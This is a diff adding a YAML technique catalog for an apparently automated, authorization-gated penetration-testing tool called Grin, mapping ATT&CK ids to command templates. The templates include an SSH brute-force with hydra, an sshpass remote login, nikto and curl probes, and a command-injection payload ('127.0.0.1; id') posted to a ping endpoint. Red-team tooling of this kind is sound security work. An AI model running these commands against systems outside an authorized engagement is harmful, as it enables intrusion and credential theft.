@@ -1,0 +1,35 @@
+# catalog/attack_catalog.yaml — Grin's executable ATT&CK-tagged technique catalog.
+# Only access/exploitation techniques. NO impact/DoS/destructive entries (by design, permanently).
+# Each technique: ATT&CK id, tactic, name, action_class (spine authorizes as), tool(s),
+# command template(s) ({target} substituted), applies_when (always | port:N | service:NAME).
+techniques:
+  - {id: T1595, tactic: reconnaissance, name: Active Scanning, action_class: active-scan,
+     tools: [nmap], command_templates: ["nmap -sV {target}", "nmap -p- --open {target}"],
+     applies_when: always}
+  - {id: T1046, tactic: discovery, name: Network Service Discovery, action_class: active-scan,
+     tools: [nmap], command_templates: ["nmap -sV --script=banner {target}"], applies_when: always}
+  - {id: T1110, tactic: credential-access, name: Brute Force, action_class: exploit,
+     tools: [hydra],
+     command_templates: ["hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/passwords.txt ssh://{target}"],
+     applies_when: "port:22"}
+  - {id: T1021.004, tactic: lateral-movement, name: Remote Services - SSH, action_class: post-exploit,
+     tools: [sshpass, ssh],
+     command_templates: ["sshpass -p PASSWORD ssh USER@{target} 'id'"], applies_when: "port:22"}
+  - {id: T1190, tactic: initial-access, name: Exploit Public-Facing Application, action_class: exploit,
+     tools: [curl, nikto, sqlmap],
+     command_templates: ["curl -s http://{target}/", "nikto -h http://{target}/"],
+     applies_when: "port:80"}
+  - {id: T1059, tactic: execution, name: Command and Scripting Interpreter, action_class: exploit,
+     tools: [curl],
+     command_templates: ["curl -s 'http://{target}/ping' --data 'host=127.0.0.1; id'"],
+     applies_when: "service:http"}
+  - {id: T1083, tactic: discovery, name: File and Directory Discovery, action_class: post-exploit,
+     tools: [ssh, sshpass], command_templates: [], applies_when: always}
+  - {id: T1552, tactic: credential-access, name: Unsecured Credentials, action_class: post-exploit,
+     tools: [ssh, sshpass], command_templates: [], applies_when: always}
+  - {id: T1068, tactic: privilege-escalation, name: Exploitation for Privilege Escalation,
+     action_class: post-exploit, tools: [sudo, find], command_templates: [], applies_when: always}
+  - {id: T1005, tactic: collection, name: Data from Local System, action_class: post-exploit,
+     tools: [ssh, sshpass, cat], command_templates: [], applies_when: always}
+  - {id: T1041, tactic: exfiltration, name: Exfiltration Over C2 Channel (sim), action_class: post-exploit,
+     tools: [ssh, sshpass], command_templates: [], applies_when: always}
